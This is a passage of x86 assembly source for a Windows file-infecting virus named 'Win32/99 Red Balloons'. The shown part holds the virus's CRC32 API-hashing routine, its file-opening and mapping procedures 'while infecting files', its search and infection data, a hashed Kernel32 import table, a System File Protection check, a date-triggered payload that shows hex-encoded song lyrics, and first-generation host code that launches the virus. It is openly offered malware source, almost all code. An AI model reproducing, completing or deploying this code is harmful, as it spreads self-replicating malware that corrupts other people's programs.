; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

                cld
                xor     ecx, ecx
                dec     ecx
                mov     edx, ecx

NextByteCRC:    xor     eax, eax
                xor     ebx, ebx
                lodsb
                xor     al, cl
                mov     cl, ch
                mov     ch, dl
                mov     dl, dh
                mov     dh, 8

NextBitCRC:     shr     bx, 1
                rcr     ax, 1
                jnc     NoCRC
                xor     ax, 08320h
                xor     bx, 0EDB8h
NoCRC:          dec     dh
                jnz     NextBitCRC
                xor     ecx, eax
                xor     edx, ebx
                dec     edi
                jnz     NextByteCRC
                not     edx
                not     ecx
                mov     eax, edx
                rol     eax, 16
                mov     ax, cx
                ret
CRC32           endp
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º                 Useful procedures  while infecting files                 º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

Align_Size      proc

                push    edx
                xor     edx, edx
                push    eax
                div     ecx
                pop     eax
                sub     ecx, edx
                add     eax, ecx
                pop     edx
                ret
Align_Size      endp


Truncate_File   proc

                xor     eax, eax
                push    eax eax ecx
                push    dword ptr [ebp + File_Handle]
                call    dword ptr [ebp + offset ad_SetFilePointer]

                push    dword ptr [ebp + File_Handle]
                call    dword ptr [ebp + offset ad_SetEndOfFile]
                ret
Truncate_File   endp


Open_File       proc

                xor     eax, eax
                push    eax eax 03h eax
                inc     eax
                push    eax
                push    80000000h or 40000000h
                push    esi
                call    dword ptr [ebp + offset ad_CreateFileA]
                ret
Open_File       endp


FileMapping     proc

                xor     eax, eax
                push    eax ecx eax 04h eax
                push    dword ptr [ebp + File_Handle]
                call    dword ptr [ebp + offset ad_CreateFileMappingA]
                ret
FileMapping     endp


ViewOfFile      proc

                xor     eax, eax
                push    ecx eax eax 02h
                push    dword ptr [ebp + Map_Handle]
                call    dword ptr [ebp + offset ad_MapViewOfFile]
                ret
ViewOfFile      endp
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ


; ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±± Data  area ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

Data_Start:

; ÄÄ´ Some useful data while searching and infecting files ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Max_Path                        equ            260

Windows_Directory               db Max_Path dup (?)
System_Directory                db Max_Path dup (?)
Current_Directory               db Max_Path dup (?)

File_CreationTime               dq               0
File_LastAccessTime             dq               0
File_LastWriteTime              dq               0

FILETIME                        struct
        FT_dwLowDateTime        dd               ?
        FT_dwHighDateTime       dd               ?
FILETIME                        ends

WIN32_FIND_DATA                 label   byte
        WFD_dwFileAttributes    dd               ?
        WFD_ftCreationTime      FILETIME         ?
        WFD_ftLastAccessTime    FILETIME         ?
        WFD_ftLastWriteTime     FILETIME         ?
        WFD_nFileSizeHigh       dd               ?
        WFD_nFileSizeLow        dd               ?
        WFD_dwReserved0         dd               ?
        WFD_dwReserved1         dd               ?
        WFD_szFileName          db Max_Path dup (?)
        WFD_szAlternateFileName db       13 dup (?)
                                db       03 dup (?)

Search_Handle                   dd             00h
Search_Mask                     db         '*.*',0

File_NewSize                    dd             00h
File_Handle                     dd             00h
File_Attributes                 dd             00h

Inf_Flag                        dd             00h

Map_Address                     dd             00h
Map_Handle                      dd             00h
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄ´ Miscellaneous data ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Kernel32                        dd      00h

sz_SFC                          db      'SFC.dll',0
ad_SFC                          dd      00h
sz_User32                       db      'USER32.dll',0
ad_User32                       dd      00h

Host_ImageBase                  dd      00h
Host_OldIP                      dd      00h
Host_NewIP                      dd      00h

Infections_Limit                dd      00h

SYSTEMTIME                      struct
        ST_wYear                dw       ?
        ST_wMonth               dw       ?
        ST_wDayOfWeek           dw       ?
        ST_wDay                 dw       ?
        ST_wHour                dw       ?
        ST_wMinute              dw       ?
        ST_wSecond              dw       ?
        ST_wMilliseconds        dw       ?
SYSTEMTIME                      ends
SystemTime                SYSTEMTIME     ?

Birth_Month                     dw       ?
Birth_Day                       dw       ?

CurrentComputerName             db      0Fh dup (?)
ComputerName                    db      0Fh dup (?)
ComputerLength                  dd      10h

CanPayload                      db      00h
CanSFC                          db      00h

Address                         dd      00h
Names                           dd      00h
Ordinals                        dd      00h
Counter                         dw      00h

CopyRight                       db      'Win32/99 Red Balloons',0
                                db      '(c) 2002 Tokugawa Ieyasu',0
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄ´ Kernel32 APIs used by the virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

crc_k32Apis_Start               label   byte
                                dd      068624A9Dh
                                dd      08C892DDFh
                                dd      096B2D96Ch
                                dd      0C200BE21h
                                dd      0AE17EBEFh
                                dd      0AA700106h
                                dd      086663B60h
                                dd      0EBC6C18Bh
                                dd      0C633D3DEh
                                dd      04434E8FEh
                                dd      0FFC97C1Fh
                                dd      0593AE7CEh
                                dd      075B7EBE8h
                                dd      0FE248274h
                                dd      04134D1ADh
                                dd      0797B49ECh
                                dd      0B2DBD7DCh
                                dd      059994ED6h
                                dd      03C19E536h
                                dd      085859D42h
                                dd      04B2A3E7Dh
                                dd      094524B42h
                                db      0FFh
crc_k32Apis_End                 label   byte

ad_k32Apis_Start                label   byte
        ad_CloseHandle          dd      00h
        ad_CreateFileA          dd      00h
        ad_CreateFileMappingA   dd      00h
        ad_FindClose            dd      00h
        ad_FindFirstFileA       dd      00h
        ad_FindNextFileA        dd      00h
        ad_GetComputerNameA     dd      00h
        ad_GetCurrentDirectoryA dd      00h
        ad_GetFileAttributesA   dd      00h
        ad_GetFileTime          dd      00h
        ad_GetProcAddress       dd      00h
        ad_GetSystemDirectoryA  dd      00h
        ad_GetSystemTime        dd      00h
        ad_GetWindowsDirectoryA dd      00h
        ad_LoadLibraryA         dd      00h
        ad_MapViewOfFile        dd      00h
        ad_SetCurrentDirectoryA dd      00h
        ad_SetEndOfFile         dd      00h
        ad_SetFileAttributesA   dd      00h
        ad_SetFilePointer       dd      00h
        ad_SetFileTime          dd      00h
        ad_UnmapViewOfFile      dd      00h
ad_k32Apis_End                  label   byte
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄ´ Extra APIs used by the virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        sz_MessageBoxA          db      'MessageBoxA',0
        ad_MessageBoxA          dd      00h
        sz_SfcIsFileProtected   db      'SfcIsFileProtected',0
        ad_SfcIsFileProtected   dd      00h
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Payload Data ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

@Title: db      05Bh,057h,069h,06Eh,033h,032h,02Fh,039h,039h,020h,052h,065h
        db      064h,020h,042h,061h,06Ch,06Ch,06Fh,06Fh,06Eh,073h,05Dh,020h
        db      062h,079h,020h,054h,06Fh,06Bh,075h,067h,061h,077h,061h,020h
        db      049h,065h,079h,061h,073h,075h,000h
@@@1st: db      059h,06Fh,075h,020h,061h,06Eh,064h,020h,049h,020h,069h,06Eh
        db      020h,061h,020h,06Ch,069h,074h,074h,06Ch,065h,020h,074h,06Fh
        db      079h,020h,073h,068h,06Fh,070h,00Dh,00Ah,042h,075h,079h,020h
        db      061h,020h,062h,061h,067h,020h,06Fh,066h,020h,062h,061h,06Ch
        db      06Ch,06Fh,06Fh,06Eh,073h,020h,077h,069h,074h,068h,020h,074h
        db      068h,065h,020h,06Dh,06Fh,06Eh,065h,079h,020h,077h,065h,027h
        db      076h,065h,020h,067h,06Fh,074h,00Dh,00Ah,053h,065h,074h,020h
        db      074h,068h,065h,06Dh,020h,066h,072h,065h,065h,020h,061h,074h
        db      020h,074h,068h,065h,020h,062h,072h,065h,061h,06Bh,020h,06Fh
        db      066h,020h,064h,061h,077h,06Eh,00Dh,00Ah,027h,054h,069h,06Ch
        db      020h,06Fh,06Eh,065h,020h,062h,079h,020h,06Fh,06Eh,065h,02Ch
        db      020h,074h,068h,065h,079h,020h,077h,065h,072h,065h,020h,067h
        db      06Fh,06Eh,065h,00Dh,00Ah,042h,061h,063h,06Bh,020h,061h,074h
        db      020h,062h,061h,073h,065h,02Ch,020h,062h,075h,067h,073h,020h
        db      069h,06Eh,020h,074h,068h,065h,020h,073h,06Fh,066h,074h,077h
        db      061h,072h,065h,00Dh,00Ah,046h,06Ch,061h,073h,068h,020h,074h
        db      068h,065h,020h,06Dh,065h,073h,073h,061h,067h,065h,02Ch,020h
        db      022h,053h,06Fh,06Dh,065h,074h,068h,069h,06Eh,067h,027h,073h
        db      020h,06Fh,075h,074h,020h,074h,068h,065h,072h,065h,022h,00Dh
        db      00Ah,046h,06Ch,06Fh,061h,074h,069h,06Eh,067h,020h,069h,06Eh
        db      020h,074h,068h,065h,020h,073h,075h,06Dh,06Dh,065h,072h,020h
        db      073h,06Bh,079h,00Dh,00Ah,039h,039h,020h,072h,065h,064h,020h
        db      062h,061h,06Ch,06Ch,06Fh,06Fh,06Eh,073h,020h,067h,06Fh,020h
        db      062h,079h,000h
@@@2nd: db      039h,039h,020h,072h,065h,064h,020h,062h,061h,06Ch,06Ch,06Fh
        db      06Fh,06Eh,073h,020h,066h,06Ch,06Fh,061h,074h,069h,06Eh,067h
        db      020h,069h,06Eh,020h,074h,068h,065h,020h,073h,075h,06Dh,06Dh
        db      065h,072h,020h,073h,06Bh,079h,00Dh,00Ah,050h,061h,06Eh,069h
        db      063h,020h,062h,065h,06Ch,06Ch,073h,02Ch,020h,069h,074h,027h
        db      073h,020h,072h,065h,064h,020h,061h,06Ch,065h,072h,074h,00Dh
        db      00Ah,054h,068h,065h,072h,065h,027h,073h,020h,073h,06Fh,06Dh
        db      065h,074h,068h,069h,06Eh,067h,020h,068h,065h,072h,065h,020h
        db      066h,072h,06Fh,06Dh,020h,073h,06Fh,06Dh,065h,077h,068h,065h
        db      072h,065h,020h,065h,06Ch,073h,065h,00Dh,00Ah,054h,068h,065h
        db      020h,077h,061h,072h,020h,06Dh,061h,063h,068h,069h,06Eh,065h
        db      020h,073h,070h,072h,069h,06Eh,067h,073h,020h,074h,06Fh,020h
        db      06Ch,069h,066h,065h,00Dh,00Ah,04Fh,070h,065h,06Eh,073h,020h
        db      075h,070h,020h,06Fh,06Eh,065h,020h,065h,061h,067h,065h,072h
        db      020h,065h,079h,065h,00Dh,00Ah,046h,06Fh,063h,075h,073h,069h
        db      06Eh,067h,020h,069h,074h,020h,06Fh,06Eh,020h,074h,068h,065h
        db      020h,073h,06Bh,079h,00Dh,00Ah,039h,039h,020h,072h,065h,064h
        db      020h,062h,061h,06Ch,06Ch,06Fh,06Fh,06Eh,073h,020h,067h,06Fh
        db      020h,062h,079h,000h
@@@3rd: db      039h,039h,020h,044h,065h,063h,069h,073h,069h,06Fh,06Eh,020h
        db      053h,074h,072h,065h,065h,074h,02Ch,020h,039h,039h,020h,06Dh
        db      069h,06Eh,069h,073h,074h,065h,072h,073h,020h,06Dh,065h,065h
        db      074h,00Dh,00Ah,054h,06Fh,020h,077h,06Fh,072h,072h,079h,02Ch
        db      020h,077h,06Fh,072h,072h,079h,02Ch,020h,073h,075h,070h,065h
        db      072h,02Dh,073h,063h,075h,072h,072h,079h,00Dh,00Ah,043h,061h
        db      06Ch,06Ch,020h,06Fh,075h,074h,020h,074h,068h,065h,020h,074h
        db      072h,06Fh,06Fh,070h,073h,020h,06Eh,06Fh,077h,020h,069h,06Eh
        db      020h,061h,020h,068h,075h,072h,072h,079h,00Dh,00Ah,054h,068h
        db      069h,073h,020h,069h,073h,020h,077h,068h,061h,074h,020h,077h
        db      065h,027h,076h,065h,020h,077h,061h,069h,074h,065h,064h,020h
        db      066h,06Fh,072h,00Dh,00Ah,054h,068h,069h,073h,020h,069h,073h
        db      020h,069h,074h,020h,062h,06Fh,079h,073h,02Ch,020h,074h,068h
        db      069h,073h,020h,069h,073h,020h,077h,061h,072h,00Dh,00Ah,054h
        db      068h,065h,020h,070h,072h,065h,073h,069h,064h,065h,06Eh,074h
        db      020h,069h,073h,020h,06Fh,06Eh,020h,074h,068h,065h,020h,06Ch
        db      069h,06Eh,065h,00Dh,00Ah,041h,073h,020h,039h,039h,020h,072h
        db      065h,064h,020h,062h,061h,06Ch,06Ch,06Fh,06Fh,06Eh,073h,020h
        db      067h,06Fh,020h,062h,079h,000h
@@@4th: db      039h,039h,020h,06Bh,06Eh,069h,067h,068h,074h,073h,020h,06Fh
        db      066h,020h,074h,068h,065h,020h,061h,069h,072h,00Dh,00Ah,04Ch
        db      069h,06Bh,065h,020h,073h,075h,070h,065h,072h,020h,068h,069h
        db      067h,068h,02Dh,074h,065h,063h,068h,020h,06Ah,065h,074h,020h
        db      066h,069h,067h,068h,074h,065h,072h,073h,00Dh,00Ah,045h,076h
        db      065h,072h,079h,06Fh,06Eh,065h,027h,073h,020h,061h,020h,073h
        db      075h,070h,065h,072h,068h,065h,072h,06Fh,00Dh,00Ah,045h,076h
        db      065h,072h,079h,06Fh,06Eh,065h,027h,073h,020h,061h,020h,043h
        db      061h,070h,074h,061h,069h,06Eh,020h,04Bh,069h,072h,06Bh,00Dh
        db      00Ah,057h,069h,074h,068h,020h,06Fh,072h,064h,065h,072h,073h
        db      020h,074h,06Fh,020h,069h,064h,065h,06Eh,074h,069h,066h,079h
        db      02Ch,020h,074h,06Fh,020h,063h,06Ch,061h,072h,069h,066h,079h
        db      020h,061h,06Eh,064h,020h,063h,06Ch,061h,073h,073h,069h,066h
        db      079h,00Dh,00Ah,053h,063h,072h,061h,06Dh,06Dh,062h,065h,072h
        db      06Ch,069h,06Eh,067h,020h,074h,068h,065h,020h,073h,075h,06Dh
        db      06Dh,065h,072h,020h,073h,06Bh,079h,00Dh,00Ah,039h,039h,020h
        db      072h,065h,064h,020h,062h,061h,06Ch,06Ch,06Fh,06Fh,06Eh,073h
        db      020h,067h,06Fh,020h,062h,079h,000h
@@@5th: db      039h,039h,020h,064h,072h,065h,061h,06Dh,073h,020h,049h,020h
        db      068h,061h,076h,065h,020h,068h,061h,064h,00Dh,00Ah,049h,06Eh
        db      020h,065h,076h,065h,072h,079h,020h,06Fh,06Eh,065h,020h,061h
        db      020h,072h,065h,064h,020h,062h,061h,06Ch,06Ch,06Fh,06Fh,06Eh
        db      00Dh,00Ah,049h,074h,027h,073h,020h,061h,06Ch,06Ch,020h,06Fh
        db      076h,065h,072h,020h,061h,06Eh,064h,020h,049h,027h,06Dh,020h
        db      073h,074h,061h,06Eh,064h,069h,06Eh,067h,020h,070h,072h,065h
        db      074h,074h,079h,00Dh,00Ah,049h,06Eh,020h,074h,068h,069h,073h
        db      020h,064h,075h,073h,074h,020h,074h,068h,061h,074h,020h,077h
        db      061h,073h,020h,061h,020h,063h,069h,074h,079h,00Dh,00Ah,049h
        db      066h,020h,049h,020h,063h,06Fh,075h,06Ch,064h,020h,066h,069h
        db      06Eh,064h,020h,061h,020h,073h,06Fh,075h,076h,065h,06Eh,069h
        db      072h,00Dh,00Ah,04Ah,075h,073h,074h,020h,074h,06Fh,020h,070h
        db      072h,06Fh,076h,065h,020h,074h,068h,065h,020h,077h,06Fh,072h
        db      06Ch,064h,020h,077h,061h,073h,020h,068h,065h,072h,065h,00Dh
        db      00Ah,041h,06Eh,064h,020h,068h,065h,072h,065h,020h,069h,073h
        db      02Ch,020h,061h,020h,072h,065h,064h,020h,062h,061h,06Ch,06Ch
        db      06Fh,06Fh,06Eh,00Dh,00Ah,049h,020h,074h,068h,069h,06Eh,06Bh
        db      020h,06Fh,066h,020h,079h,06Fh,075h,020h,061h,06Eh,064h,020h
        db      06Ch,065h,074h,020h,069h,074h,020h,067h,06Fh,000h
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
RB_End          label   byte


; ²²²²²²²²²²²²²²²²²²²²²²²² First generation host code ²²²²²²²²²²²²²²²²²²²²²²²²

; ÄÄ´ Call the virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

RB_Host:        jmp     RB


; ÄÄ´ Real host ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

FirstGen_Host:  push    10h
                push    offset sz_Title
                push    offset sz_Message
                push    00h
                call    MessageBoxA

                push    00h
                call    ExitProcess

end             RB_Host
end
